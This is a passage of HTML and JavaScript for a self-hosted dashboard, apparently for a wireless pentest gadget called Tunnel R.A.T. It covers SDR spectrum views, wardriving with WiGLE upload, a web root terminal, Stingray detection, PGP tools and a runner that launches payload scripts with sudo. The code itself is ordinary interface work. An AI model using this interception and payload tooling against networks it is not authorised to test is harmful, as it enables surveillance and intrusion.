          <div style="display:flex;flex-wrap:wrap;gap:16px;align-items:center;justify-content:center;width:100%">
            <canvas id="pp-canvas" width="240" height="320" style="image-rendering:pixelated;width:min(100%,255px);height:auto;border:1px solid var(--border);background:#000;cursor:crosshair"></canvas>
            <div style="display:flex;flex-direction:column;align-items:center;gap:10px">
              <div class="pp-pad">
                <button onclick="ppBtn('rotl')" title="Encoder left">⟲</button>
                <button onclick="ppBtn('up')">▲</button>
                <button onclick="ppBtn('rotr')" title="Encoder right">⟳</button>
                <button onclick="ppBtn('left')">◀</button>
                <button onclick="ppBtn('ok')">OK</button>
                <button onclick="ppBtn('right')">▶</button>
                <span></span>
                <button onclick="ppBtn('down')">▼</button>
                <span></span>
              </div>
              <div style="font-size:.72em;color:var(--border);text-align:center;max-width:170px;line-height:1.5">
                Tap the screen to touch it. Live view is 64-colour; 📸 saves full colour.
              </div>
            </div>
          </div>
        </div>
        <!-- Spectrum + waterfall (HackRF sweeps; RTL scans draw here too) -->
        <div id="lp-spectrum" style="flex:1;overflow:hidden;padding:8px;display:none;flex-direction:column;gap:6px;background:rgba(3,0,0,0.92)">
          <div style="display:flex;gap:8px;align-items:center;flex-shrink:0">
            <span style="color:var(--red);letter-spacing:.1em;font-size:.82em">SPECTRUM</span>
            <span id="spec-info" style="color:var(--border);font-size:.75em"></span>
          </div>
          <canvas id="spec-canvas" style="width:100%;height:44%;min-height:110px;border:1px solid var(--border);background:#000"></canvas>
          <canvas id="wf-canvas" style="width:100%;flex:1;min-height:90px;border:1px solid var(--border);background:#000"></canvas>
        </div>
      </div>
    </div>
    <div id="output-zone" style="display:flex;flex-direction:column;height:280px;border-top:2px solid var(--dred);background:rgba(4,0,0,0.6)">
      <div id="tool-info" style="flex:1;overflow-y:auto;padding:14px 16px;font-size:.82em;line-height:1.6;color:var(--dim)">
        <div style="color:var(--red);font-size:1.1em;letter-spacing:.1em;margin-bottom:6px">TOOL REFERENCE</div>
        <div style="color:var(--dim)">Click any tool button to see what it does, the command it runs,
        and any notes — then run it in the terminal.</div>
      </div>
    </div>
  </div><!-- /center -->

  <!-- RIGHT PANEL -->
  <div class="side-panel right">
    <div class="panel-title">SYSTEM STATUS</div>
    <div class="stat-row"><span class="stat-key">TUNNEL</span><span class="stat-val active">ACTIVE</span></div>
    <div class="stat-row"><span class="stat-key">REMOTE</span><span class="stat-val" id="s-ip">—</span></div>
    <div class="stat-row"><span class="stat-key">STATUS</span><span class="stat-val active">SECURE</span></div>
    <div class="stat-row"><span class="stat-key">NODE</span><span class="stat-val">ALPHA_R00T</span></div>
    <div class="stat-row"><span class="stat-key">UPTIME</span><span class="stat-val" id="s-uptime">—</span></div>
    <div class="stat-row"><span class="stat-key">STINGRAY</span><span class="stat-val" id="s-stingray">—</span></div>
    <div class="stat-row"><span class="stat-key">TEMP</span><span class="stat-val" id="s-temp">—</span></div>
    <div class="stat-row">
      <span class="stat-key">CPU</span>
      <div class="bar-wrap"><div class="bar-fill" id="cpu-bar" style="width:0%"></div></div>
      <span class="stat-val" id="s-cpu">—</span>
    </div>
    <div class="stat-row">
      <span class="stat-key">RAM</span>
      <div class="bar-wrap"><div class="bar-fill" id="ram-bar" style="width:0%"></div></div>
      <span class="stat-val" id="s-ram">—</span>
    </div>
    <div class="stat-row">
      <span class="stat-key">DISK</span>
      <div class="bar-wrap"><div class="bar-fill" id="disk-bar" style="width:0%"></div></div>
      <span class="stat-val" id="s-disk">—</span>
    </div>
    <div class="stat-row"><span class="stat-key">SDR</span><span class="stat-val" id="s-sdr">—</span></div>
    <div class="stat-row"><span class="stat-key">PORTAPACK</span><span class="stat-val" id="s-pp">—</span></div>
    <div class="stat-row"><span class="stat-key">FLIPPER</span><span class="stat-val" id="s-fz">—</span></div>

    <div class="panel-title" style="margin-top:12px">R.A.T. PROTOCOL ACTIVE</div>
    <div style="color:var(--dim);font-size:.72em;line-height:1.8">
      NETWORK SCANNING...<br>
      INTERCEPTING TRAFFIC...
    </div>

    <div class="panel-title" style="margin-top:12px">ACTIVE TOOLS</div>
    <div id="active-tools">
      <span class="pill">bettercap</span>
      <span class="pill">suricata</span>
      <span class="pill">zeek</span>
    </div>

    <div class="panel-title" style="margin-top:12px">ACTIVITY LOG</div>
    <div id="activity-log"></div>
  </div><!-- /right -->

</div><!-- /main -->

<div class="proto-text right">R.A.T. PROTOCOL ACTIVE<br>NETWORK SCANNING...<br>INTERCEPTING TRAFFIC...</div>

<div id="tooltip-box"></div>
<div id="tooltip-box" style="position:fixed;background:var(--card);border:1px solid var(--dred);color:var(--xred);padding:8px 12px;font-size:.75em;white-space:pre-line;z-index:9999;border-radius:2px;pointer-events:none;max-width:220px;line-height:1.6;box-shadow:0 0 16px var(--red)55;display:none;font-family:monospace"></div>
<div id="statusbar">
  <span><span id="live-dot"></span>TUNNEL R.A.T. v14 — cyberchuck01</span>
  <span id="sb-time"></span>
  <span>■ LIVE</span>
</div>

<script>
// API key injected by the server so the browser can authenticate to the
// protected CLI endpoint. The page is only served to someone who can reach
// the dashboard, so this does not widen access.
const TR_KEY = '__TR_API_KEY__';
// SDR helpers write to `out`; there's no #main-out element, so route that
// text into the terminal pane (each assignment becomes a new line there).
const out = {
  get textContent(){ return ''; },
  set textContent(v){ if(v) cliAppend('<span style="color:#cc2222">'+ansiToHtml(String(v))+'</span>'); },
  scrollTop: 0, scrollHeight: 0
};


function switchTab(id, btn) {
  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
  btn.classList.add('active');
  document.querySelectorAll('.tab-content').forEach(t=>t.classList.remove('active'));
  const lc = document.getElementById('left-'+id);
  if(lc) lc.classList.add('active');
  if(id==='wifi'){ wifiStatus(); loadAdapters(); }
  if(id==='anon') pgpEnsureLib();
  if(id==='pineapple'){ pagerRefresh(); loadPayloads(); }
  if(id==='files') loadFiles();
  if(id==='log') loadLog();
  if(id==='wardrive'){ loadWardrive(); loadWardriveFiles(); loadWigleStatus(); }
  if(id==='portapack') ppStatus();
  if(id==='flipper') fzStatus();
  if(id==='stingray') srInit(); else srStop();
  // Widen the left column for the terminal so it's full-width; normal otherwise.
  const main=document.getElementById('main');
  if(main){ if(id==='terminal'||id==='stingray') main.classList.add('term-wide'); else main.classList.remove('term-wide'); }
  // Hide the bottom quick-command CLI on the terminal tab (the real terminal
  // replaces it) for a clean look; show it on every other tab.
  const oz=document.getElementById('output-zone');
  if(oz){ oz.style.setProperty('display', (id==='terminal')?'none':'flex', 'important'); }
  if(id==='terminal') termInit();
}

// ---- STINGRAY WATCH (proxied from the tunnel-rat-orbic-link service) ----
let _srTimer=null;
const SR_SEV={high:'var(--xred)',medium:'#e8a33a',low:'var(--dim)'};
const SR_SRC={tower:'tower check',rayhunter:'Rayhunter',test:'test'};
function srEsc(s){return String(s==null?'':s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}
function srAgo(ts){const s=Math.max(0,Date.now()/1000-ts);
  return s<60?Math.floor(s)+'s ago':s<3600?Math.floor(s/60)+' min ago':s<86400?Math.floor(s/3600)+' h ago':new Date(ts*1000).toLocaleString();}
function srMapUrl(){return location.protocol+'//'+location.hostname+':8091/';}
function srSet(id,txt,on){const e=document.getElementById(id); if(!e) return; e.textContent=txt; e.classList.toggle('active',!!on);}
function srNote(t){const n=document.getElementById('sr-msg'); if(!n) return; n.textContent=t;
  clearTimeout(n._h); n._h=setTimeout(()=>{n.textContent='';},6000);}
function srInit(){
  const f=document.getElementById('sr-map'); if(f && !f.getAttribute('src')) f.src=srMapUrl();
  const a=document.getElementById('sr-maplink'); if(a) a.href=srMapUrl();
  srRefresh();
  if(!_srTimer) _srTimer=setInterval(srRefresh,4000);
}
function srStop(){ if(_srTimer){ clearInterval(_srTimer); _srTimer=null; } }
function srRefresh(){
  fetch('/api/stingray/state',{headers:{'X-API-Key':TR_KEY}}).then(r=>r.json()).then(d=>{
    const down=document.getElementById('sr-down');
    if(!d.ok){
      down.style.display='block';
      down.textContent='Stingray Watch service isn\u2019t running. Start it with: systemctl start tunnel-rat-orbic-link';
      srSet('sr-orbic','SERVICE DOWN',false); return;
    }
    down.style.display='none';
    const s=d.state||{};
    srSet('sr-orbic', s.mode==='live'?'LIVE (FORK)':s.mode==='polling'?'STOCK RAYHUNTER':'NOT FOUND', s.mode==='live'||s.mode==='polling');
    srSet('sr-rec', s.recording===true?'RECORDING':s.recording===false?'STOPPED':'—', s.recording===true);
    srSet('sr-gps', s.gps?('FIX \u00b1'+Math.round(s.gps.acc)+' m'):'NO FIX', !!s.gps);
    srSet('sr-net', s.online?'ONLINE':'OFFLINE', !!s.online);
    const c=s.cell;
    srSet('sr-tower', c?c.id:'—', false);
    document.getElementById('sr-tower-note').textContent = c
      ? ((c.listed===null?'OpenCellID not set up':c.listed?'Listed in OpenCellID':'Not in OpenCellID')+', heard '+c.seen+' times')
      : (s.mode==='polling'?'The live tower feed needs the Tunnel R.A.T. fork on the Orbic.':'');
    const al=d.alerts||[];
    document.getElementById('sr-alerts').innerHTML = al.length ? al.map(a=>{
      const col=SR_SEV[a.sev]||'var(--dim)';
      return '<div style="border-left:3px solid '+col+';padding:3px 0 3px 7px;margin-bottom:6px">'
        +'<b style="color:'+col+'">'+srEsc((a.sev||'').toUpperCase())+'</b> '
        +'<span style="color:var(--dim)">'+srEsc(SR_SRC[a.source]||a.source)+', '+srAgo(a.ts)+'</span><br>'
        +srEsc(a.reason)+(a.cell?'<br><span style="color:var(--dim)">tower '+srEsc(a.cell)+'</span>':'')+'</div>';
    }).join('') : '<div style="color:var(--dim)">No alerts yet. When one fires it shows here and on your phone.</div>';
  }).catch(()=>{});
}
function srCmd(cmd){
  srNote('Working\u2026');
  fetch('/api/stingray/cmd',{method:'POST',headers:{'X-API-Key':TR_KEY,'Content-Type':'application/json'},body:JSON.stringify({cmd:cmd})})
    .then(r=>r.json()).then(d=>{ srNote(d.detail||(d.ok?'Done':'Failed')); srRefresh(); })
    .catch(()=>srNote('No answer from the dashboard'));
}
function srMini(){
  fetch('/api/stingray/state',{headers:{'X-API-Key':TR_KEY}}).then(r=>r.json()).then(d=>{
    const e=document.getElementById('s-stingray'); if(!e) return;
    if(!d.ok){ e.textContent='OFF'; e.classList.remove('active'); return; }
    const m=(d.state||{}).mode;
    const recent=(d.alerts||[]).filter(a=>a.sev!=='low' && a.source!=='test' && Date.now()/1000-a.ts<86400).length;
    e.textContent=(m==='live'?'LIVE':m==='polling'?'STOCK':'NO ORBIC')+(recent?(', '+recent+' ALERT'+(recent>1?'S':'')):'');
    e.classList.toggle('active', m==='live'||m==='polling');
  }).catch(()=>{});
}
srMini(); setInterval(srMini,15000);

// ---- Full web terminal (xterm.js + PTY) ----
let _xterm=null, _xpoll=null, _xloaded=false;
function termLoadLib(cb){
  if(_xloaded){ cb(); return; }
  // The copy saved on the NanoPi first (works offline), the CDN as a fallback.
  const srcs=[['/vendor/xterm/xterm.min.js','/vendor/xterm/xterm.min.css'],
              ['https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js',
               'https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.min.css']];
  function attempt(i){
    if(i>=srcs.length){
      document.getElementById('xterm-host').innerHTML='<div style="color:var(--red);padding:10px;font-size:.8em">Couldn\u2019t load the terminal library. Re-run the installer once with internet so it saves a copy on the NanoPi. SSH still works as a backup.</div>';
      return;
    }
    const css=document.createElement('link'); css.rel='stylesheet'; css.href=srcs[i][1];
    document.head.appendChild(css);
    const s=document.createElement('script'); s.src=srcs[i][0];
    s.onload=()=>{ _xloaded=true; cb(); };
    s.onerror=()=>{ css.remove(); s.remove(); attempt(i+1); };
    document.head.appendChild(s);
  }
  attempt(0);
}
function termFontSize(){
  try{ const s=parseInt(localStorage.getItem('tr_term_fs')||'',10); if(s>=9&&s<=24) return s; }catch(e){}
  return matchMedia('(pointer: coarse)').matches?14:13;
}
function termInit(){
  termLoadLib(()=>{
    if(_xterm) { setTimeout(termFit,60); return; }
    _xterm=new Terminal({cursorBlink:true,fontSize:termFontSize(),fontFamily:'monospace',scrollback:3000,
      theme:{background:'#000000',foreground:'#d0d0d0'}});
    _xterm.open(document.getElementById('xterm-host'));
    termTouchSetup();
    _xterm.onData(d=>termSend(termMods(d)));
    setTimeout(termFit,60);
    // poll for output
    _xpoll=setInterval(()=>{
      fetch('/api/term/read',{headers:{'X-API-Key':TR_KEY}})
        .then(r=>r.arrayBuffer()).then(b=>{
          if(b.byteLength){ _xterm.write(new Uint8Array(b)); }
        }).catch(()=>{});
    },250);
  });
}
function termSend(d){
  if(!d) return;
  fetch('/api/term/write',{method:'POST',headers:{'X-API-Key':TR_KEY,'Content-Type':'application/octet-stream'},body:d});
}
function termCell(){
  try{ const d=_xterm._core._renderService.dimensions; const c=d.css?d.css.cell:null; if(c&&c.width&&c.height) return c; }catch(e){}
  const fs=(_xterm&&_xterm.options.fontSize)||13; return {width:fs*0.6,height:fs*1.25};
}
function termFit(){
  if(!_xterm) return;
  const host=document.getElementById('xterm-host');
  const c=termCell();
  const cols=Math.max(20,Math.floor((host.clientWidth-4)/c.width));
  const rows=Math.max(6,Math.floor((host.clientHeight-4)/c.height));
  try{ _xterm.resize(cols,rows); }catch(e){}
  fetch('/api/term/resize',{method:'POST',headers:{'X-API-Key':TR_KEY,'Content-Type':'application/json'},body:JSON.stringify({rows,cols})});
}
function termZoom(delta){
  if(!_xterm) return;
  const s=Math.max(9,Math.min(24,(_xterm.options.fontSize||13)+delta));
  _xterm.options.fontSize=s;
  try{ localStorage.setItem('tr_term_fs',s); }catch(e){}
  setTimeout(termFit,60);
}

// ---- v14: touch terminal — tap to type, extra keys, swipe to scroll ----
const TERM_KEYS={esc:'\x1b',tab:'\t',up:'\x1b[A',down:'\x1b[B',right:'\x1b[C',left:'\x1b[D',
  home:'\x1b[H',end:'\x1b[F',pgup:'\x1b[5~',pgdn:'\x1b[6~',ctrlc:'\x03'};
const _tMod={ctrl:false,alt:false};
function termModSet(m,on){
  _tMod[m]=on;
  const b=document.getElementById('tk-'+m);
  if(b){ b.classList.toggle('on',on); b.setAttribute('aria-pressed',on?'true':'false'); }
}
function termMods(d){
  // Sticky Ctrl/Alt from the key row apply to the next key typed.
  if(!_tMod.ctrl && !_tMod.alt) return d;
  let out=d;
  if(_tMod.ctrl && d.length===1){
    const c=d.toLowerCase(), k=c.charCodeAt(0);
    const sym={'@':'\x00',' ':'\x00','[':'\x1b','\\':'\x1c',']':'\x1d','^':'\x1e','_':'\x1f','?':'\x7f'};
    if(k>=97&&k<=122) out=String.fromCharCode(k-96);
    else if(sym[c]!==undefined) out=sym[c];
  }
  if(_tMod.alt) out='\x1b'+out;
  termModSet('ctrl',false); termModSet('alt',false);
  return out;
}
function termKeyboard(){
  if(!_xterm) return;
  const ta=_xterm.textarea;
  if(ta && document.activeElement===ta) ta.blur(); else _xterm.focus();
}
function termKey(k){
  if(k==='ctrl'||k==='alt'){ termModSet(k,!_tMod[k]); return; }
  if(k==='kbd'){ termKeyboard(); return; }
  if(TERM_KEYS[k]===undefined){ termSend(termMods(k)); return; }   // | ~ / -
  let seq=TERM_KEYS[k];
  if(_tMod.alt) seq='\x1b'+seq;
  termModSet('ctrl',false); termModSet('alt',false);
  termSend(seq);
}
function termTouchSetup(){
  const host=document.getElementById('xterm-host');
  const ta=_xterm.textarea;
  if(ta){
    ['autocapitalize','autocorrect','autocomplete'].forEach(a=>ta.setAttribute(a,'off'));
    ta.setAttribute('spellcheck','false');
  }
  let y0=0, last=0, acc=0, moved=false;
  host.addEventListener('touchstart',e=>{
    if(e.touches.length!==1) return;
    y0=last=e.touches[0].clientY; acc=0; moved=false;
  },{passive:true});
  host.addEventListener('touchmove',e=>{
    if(e.touches.length!==1) return;
    const y=e.touches[0].clientY;
    acc+=last-y; last=y;                       // finger up = later output
    if(Math.abs(y-y0)>8) moved=true;
    const h=termCell().height||16;
    const n=Math.trunc(acc/h);
    if(n){ _xterm.scrollLines(n); acc-=n*h; }
    if(moved) e.preventDefault();
  },{passive:false});
  host.addEventListener('touchend',()=>{ if(!moved) _xterm.focus(); },{passive:true});
}
// Key row: act on press without taking focus, so the on-screen keyboard stays up.
document.querySelectorAll('#term-keys button').forEach(b=>{
  const act=e=>{ e.preventDefault(); termKey(b.dataset.k); };
  b.addEventListener('touchstart',act,{passive:false});
  b.addEventListener('mousedown',act);
});
// Shrink the terminal to sit above the on-screen keyboard, and re-fit on rotation.
function termViewportFit(){
  const host=document.getElementById('xterm-host');
  const tab=document.getElementById('left-terminal');
  if(!host||!_xterm||!tab||!tab.classList.contains('active')) return;
  const vv=window.visualViewport;
  const kb=vv && (window.innerHeight-vv.height)>120;
  if(kb){
    const keys=document.getElementById('term-keys');
    (keys||host).scrollIntoView({block:'start'});
    host.style.minHeight='0';
    host.style.height=Math.max(120, vv.height-(keys?keys.offsetHeight:0)-12)+'px';
  } else {
    host.style.height=''; host.style.minHeight='';
  }
  setTimeout(termFit,60);
}
if(window.visualViewport) window.visualViewport.addEventListener('resize',termViewportFit);
window.addEventListener('orientationchange',()=>setTimeout(()=>{ termViewportFit(); termFit(); },300));
function termRestart(){
  fetch('/api/term/kill',{method:'POST',headers:{'X-API-Key':TR_KEY}}).then(()=>{
    if(_xterm) _xterm.clear();
  });
}
window.addEventListener('resize',()=>{ if(_xterm) termFit(); });

// ---- Wardrive saved files (WiGLE CSVs) ----
let _wdFiles=[], _wdDir='';
function loadWardriveFiles(){
  fetch('/api/wardrive/files',{headers:{'X-API-Key':TR_KEY}}).then(r=>r.json()).then(d=>{
    _wdFiles=d.files||[]; _wdDir=d.dir||'';
    const sel=document.getElementById('wd-files');
    if(!sel) return;
    const cur=sel.value;
    sel.innerHTML='<option value="">— select a saved CSV —</option>';
    _wdFiles.forEach(f=>{
      const o=document.createElement('option');
      o.value=f.path;
      o.textContent=f.name+'  ('+f.rows+' nets, '+f.size_kb+'KB)';
      sel.appendChild(o);
    });
    sel.value=cur;
    const info=document.getElementById('wd-file-info');
    if(info && !_wdFiles.length) info.textContent='No wardrive files yet. Start a session to create one.';
    else if(info) info.textContent='Files saved in: '+_wdDir;
  }).catch(()=>{});
}
function wardriveFilePick(){
  const sel=document.getElementById('wd-files');
  const info=document.getElementById('wd-file-info');
  if(!sel||!info) return;
  const f=_wdFiles.find(x=>x.path===sel.value);
  if(f){
    info.innerHTML='<b style="color:var(--xred)">'+escapeHtml(f.name)+'</b><br>'+
      f.rows+' network observations &middot; '+f.size_kb+' KB &middot; '+escapeHtml(f.mtime)+'<br>'+
      '<span style="color:var(--sec)">Location:</span> '+escapeHtml(f.path)+'<br>'+
      '<span style="color:var(--dim)">Download it, then upload at wigle.net/upload</span>';
  } else {
    info.textContent='Files saved in: '+_wdDir;
  }
}
function wardriveDownload(){
  const sel=document.getElementById('wd-files');
  if(sel&&sel.value){ window.location='/api/files/download?path='+encodeURIComponent(sel.value); }
  else alert('Select a wardrive file first.');
}
function wardriveOpen(){
  const sel=document.getElementById('wd-files');
  if(sel&&sel.value){ window.open('/api/files/open?path='+encodeURIComponent(sel.value),'_blank'); }
  else alert('Select a wardrive file first.');
}
function loadWigleStatus(){
  fetch('/api/wigle/creds',{headers:{'X-API-Key':TR_KEY}}).then(r=>r.json()).then(d=>{
    const s=document.getElementById('wigle-status');
    const n=document.getElementById('wigle-name');
    if(s) s.innerHTML = d.saved ? '<span style="color:#4caf50">✓ Credentials saved'+(d.api_name?(' ('+escapeHtml(d.api_name)+')'):'')+'</span>' : 'No credentials saved yet.';
    if(n && d.api_name && !n.value) n.value=d.api_name;
  }).catch(()=>{});
}
function saveWigleCreds(){
  const name=(document.getElementById('wigle-name')||{value:''}).value.trim();
  const token=(document.getElementById('wigle-token')||{value:''}).value.trim();
  if(!token){ alert('Enter your WiGLE API Token.'); return; }
  fetch('/api/wigle/creds',{method:'POST',
    headers:{'X-API-Key':TR_KEY,'Content-Type':'application/json'},
    body:JSON.stringify({api_name:name,api_token:token})})
    .then(r=>r.json()).then(d=>{
      if(d.ok){ document.getElementById('wigle-token').value=''; loadWigleStatus(); }
      else alert('Save failed: '+(d.error||'unknown'));
    });
}
function wardriveUpload(){
  const sel=document.getElementById('wd-files');
  if(!sel||!sel.value){ alert('Select a wardrive file first.'); return; }
  const info=document.getElementById('wd-file-info');
  if(info) info.innerHTML='<span style="color:var(--yell)">Uploading to WiGLE… (needs internet)</span>';
  fetch('/api/wigle/upload',{method:'POST',
    headers:{'X-API-Key':TR_KEY,'Content-Type':'application/json'},
    body:JSON.stringify({path:sel.value})})
    .then(r=>r.json()).then(d=>{
      if(d.ok){ if(info) info.innerHTML='<span style="color:#4caf50">✓ Uploaded to WiGLE. Check your account for processing.</span>'; }
      else { if(info) info.innerHTML='<span style="color:var(--red)">Upload failed: '+escapeHtml(d.error||'unknown')+'</span>'; }
    }).catch(e=>{ if(info) info.innerHTML='<span style="color:var(--red)">Error: '+e+'</span>'; });
}

// ---- Wardrive: live SSID/MAC list ----
let _wdNets=[];
function loadWardrive(){
  const box=document.getElementById('wd-list');
  if(box) box.innerHTML='<div style="color:var(--dim);font-size:.75em">Scanning…</div>';
  fetch('/api/wardrive',{headers:{'X-API-Key':TR_KEY}}).then(r=>r.json()).then(d=>{
    _wdNets=d.nets||[];
    renderWardrive();
  }).catch(()=>{ if(box) box.innerHTML='<div style="color:var(--red);font-size:.75em">Scan failed.</div>'; });
}
function renderWardrive(){
  const box=document.getElementById('wd-list');
  if(!box) return;
  const f=(document.getElementById('wd-filter')||{value:''}).value.toLowerCase();
  const nets=_wdNets.filter(n=>n.ssid.toLowerCase().includes(f)||n.mac.toLowerCase().includes(f));
  if(!nets.length){ box.innerHTML='<div style="color:var(--dim);font-size:.75em">'+(f?'No matches.':'No networks found.')+'</div>'; return; }
  let html='<div style="font-size:.68em;color:var(--dim);display:flex;gap:6px;padding:2px 6px;border-bottom:1px solid var(--border)">'+
    '<div style="flex:1">SSID</div><div style="width:120px">MAC</div><div style="width:34px;text-align:right">sig</div><div style="width:26px;text-align:right">ch</div><div style="width:34px;text-align:right">seen</div></div>';
  nets.forEach(n=>{
    const hot = parseInt(n.count)>=3;
    html+='<div style="font-size:.7em;display:flex;gap:6px;padding:4px 6px;border-bottom:1px solid var(--ddim);'+(hot?'color:var(--xred)':'color:var(--sec)')+'">'+
      '<div style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+escapeHtml(n.ssid)+'</div>'+
      '<div style="width:120px;font-family:monospace;color:var(--dim)">'+escapeHtml(n.mac)+'</div>'+
      '<div style="width:34px;text-align:right">'+escapeHtml(n.signal)+'</div>'+
      '<div style="width:26px;text-align:right">'+escapeHtml(n.chan)+'</div>'+
      '<div style="width:34px;text-align:right'+(hot?';font-weight:bold':'')+'">×'+escapeHtml(n.count)+'</div></div>';
  });
  box.innerHTML=html;
}

// ---- Payloads (scripts in /opt/tunnel-rat/payloads) ----
function loadPayloads(){
  const box=document.getElementById('payload-list');
  if(box) box.innerHTML='<div style="color:var(--dim);font-size:.75em">Loading…</div>';
  fetch('/api/payloads').then(r=>r.json()).then(d=>{
    if(!box) return;
    const list=(d.payloads||[]);
    if(!list.length){ box.innerHTML='<div style="color:var(--dim);font-size:.75em">No payloads found in /opt/tunnel-rat/payloads.</div>'; return; }
    box.innerHTML='';
    list.forEach(p=>{
      const card=document.createElement('div');
      card.style.cssText='border:1px solid var(--border);border-radius:4px;padding:10px;margin-bottom:8px;background:var(--card)';
      card.innerHTML=
        '<div style="color:var(--red);font-size:.85em;font-weight:bold">'+escapeHtml(p.label)+'</div>'+
        '<div style="color:var(--dim);font-size:.72em;margin:4px 0 8px;line-height:1.4">'+escapeHtml(p.desc||'')+'</div>';
      const btn=document.createElement('button');
      btn.className='tool-btn'; btn.innerHTML='<span class="icon">▶</span>Run';
      btn.onclick=()=>runPayload(p.file);
      card.appendChild(btn);
      box.appendChild(card);
    });
  }).catch(()=>{ if(box) box.innerHTML='<div style="color:var(--red);font-size:.75em">Could not load payloads.</div>'; });
}
function escapeHtml(s){ return String(s).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c])); }
function runPayload(file){
  showToolInfo('payload:'+file, 'sudo bash /opt/tunnel-rat/payloads/'+file);
}

// ---- Theme engine: font/accent, window, and background colors ----
function hexToRgb(h){ h=h.replace('#',''); return [parseInt(h.slice(0,2),16),parseInt(h.slice(2,4),16),parseInt(h.slice(4,6),16)]; }
function toHex(n){ n=Math.max(0,Math.min(255,Math.round(n))); return n.toString(16).padStart(2,'0'); }
function mix(a,b,t){ const A=hexToRgb(a),B=hexToRgb(b); return '#'+toHex(A[0]+(B[0]-A[0])*t)+toHex(A[1]+(B[1]-A[1])*t)+toHex(A[2]+(B[2]-A[2])*t); }
function luminance(hex){ const [r,g,b]=hexToRgb(hex); return (0.299*r+0.587*g+0.114*b)/255; }
function applyColors(accent, windowc, bg, bgImg){
  const r=document.documentElement;
  // The page background is a deep version of the 3rd wheel's color, so panels
  // and text sit on something dark no matter what hue is picked.
  const pageBg = mix(bg, '#000000', 0.85);
  const bgLum = luminance(pageBg);
  // A color guaranteed to contrast against the page background (used to keep
  // dim text and tab text readable regardless of what's chosen).
  const contrastDim = bgLum < 0.5 ? mix(pageBg,'#ffffff',0.45) : mix(pageBg,'#000000',0.55);

  // Wheel 1 (accent): primary accent family — the accent itself is bright by
  // user choice; derived dim/border mix toward the page bg but stay visible.
  r.style.setProperty('--red', accent);
  r.style.setProperty('--xred', mix(accent,'#ffffff',0.25));
  r.style.setProperty('--dred', mix(accent,'#000000',0.2));
  r.style.setProperty('--dim', mix(accent, pageBg, 0.55));   // faded accent, still visible
  r.style.setProperty('--ddim', mix(accent, pageBg, 0.78));
  r.style.setProperty('--border', mix(accent, pageBg, 0.5));
  // Wheel 2 (secondary/window): CLI/secondary TEXT is the picked color, but if
  // it's too dark to read on the dark page, lighten it so it never vanishes.
  const secCol = luminance(windowc) < 0.35 ? mix(windowc,'#ffffff',0.6) : windowc;
  r.style.setProperty('--sec', secCol);
  r.style.setProperty('--card', mix(windowc, '#000000', 0.82));
  // Wheel 3 (tabs + background): tab text = the picked color (bright), but if
  // it's too dark to read on the dark bg, lighten it so it never vanishes.
  const tabCol = luminance(bg) < 0.35 ? mix(bg,'#ffffff',0.55) : bg;
  r.style.setProperty('--tabc', tabCol);
  r.style.setProperty('--bg', pageBg);
  // Swap the background art to match the theme, if a name was given.
  if(typeof bgImg!=='undefined' && bgImg!==null){
    setThemeBg(bgImg);
  }
  try{ localStorage.setItem('tr-colors', JSON.stringify({accent,windowc,bg,bgImg:(typeof bgImg!=='undefined'?bgImg:_curBgImg)})); }catch(e){}
  const ca=document.getElementById('c-accent'); if(ca) ca.value=accent;
  const cw=document.getElementById('c-window'); if(cw) cw.value=windowc;
  const cb=document.getElementById('c-bg'); if(cb) cb.value=bg;
}
let _curBgImg='';
function setThemeBg(name){
  _curBgImg=name||'';
  const url = name ? ("url('/bg/tr_bg_"+name+".jpg')") : '';
  // The body background keeps its dark color; the image layers on top of it.
  document.body.style.backgroundImage = url;
  document.body.style.backgroundSize = 'cover';
  document.body.style.backgroundPosition = 'center';
  document.body.style.backgroundRepeat = 'no-repeat';
  document.body.style.backgroundAttachment = 'fixed';
}
function onColors(){
  applyColors(document.getElementById('c-accent').value,
              document.getElementById('c-window').value,
              document.getElementById('c-bg').value, _curBgImg);
}
function setColors(a,w,b,bgImg){ applyColors(a,w,b,bgImg); }
function loadColors(){
  try{
    const s=localStorage.getItem('tr-colors');
    if(s){ const c=JSON.parse(s); applyColors(c.accent,c.windowc,c.bg, c.bgImg||''); }
  }catch(e){}
}
loadColors();

// ---- PGP (local, offline; openpgp.js served from the device) ----
let _pgpLoaded = false, _pgpLoading = false;
function pgpEnsureLib(){
  if(_pgpLoaded || _pgpLoading) return;
  _pgpLoading = true;
  const s = document.getElementById('pgp-genstatus');
  if(s) s.textContent = 'Loading crypto library…';
  const el = document.createElement('script');
  el.src = '/vendor/openpgp.min.js';
  el.onload = ()=>{ _pgpLoaded = true; _pgpLoading = false;
    if(s) s.textContent = 'Ready. Generate a key pair to begin.'; };
  el.onerror = ()=>{ _pgpLoading = false;
    if(s) s.textContent = 'Could not load openpgp.min.js — is it installed on the device?'; };
  document.head.appendChild(el);
}
function pgpStatus(id, msg, ok){
  const e = document.getElementById(id);
  if(e){ e.textContent = msg; e.style.color = ok ? '#4caf50' : 'var(--red)'; }
}
async function pgpGenerate(){
  if(!_pgpLoaded){ pgpStatus('pgp-genstatus','Library still loading…'); return; }
  const name=(document.getElementById('pgp-name').value||'TunnelRat').trim();
  const email=(document.getElementById('pgp-email').value||'user@tunnel.rat').trim();
  const type=document.getElementById('pgp-type').value;
  const pass=document.getElementById('pgp-pass').value||'';
  pgpStatus('pgp-genstatus','Generating '+(type==='rsa4096'?'RSA 4096 (can take 30s+)':'ECC key')+'…');
  try{
    const opts = (type==='rsa4096')
      ? {type:'rsa', rsaBits:4096, userIDs:[{name,email}], passphrase:pass}
      : {type:'ecc', curve:'curve25519', userIDs:[{name,email}], passphrase:pass};
    const {privateKey, publicKey} = await openpgp.generateKey(opts);
    document.getElementById('pgp-pub').value = publicKey;
    document.getElementById('pgp-priv').value = privateKey;
    pgpStatus('pgp-genstatus','Key pair generated. Public key is safe to share.', true);
  }catch(e){ pgpStatus('pgp-genstatus','Error: '+e.message); }
}
async function pgpEncrypt(){
  if(!_pgpLoaded){ pgpStatus('pgp-status','Library still loading…'); return; }
  const pubArmored=document.getElementById('pgp-pub').value.trim();
  const text=document.getElementById('pgp-text').value;
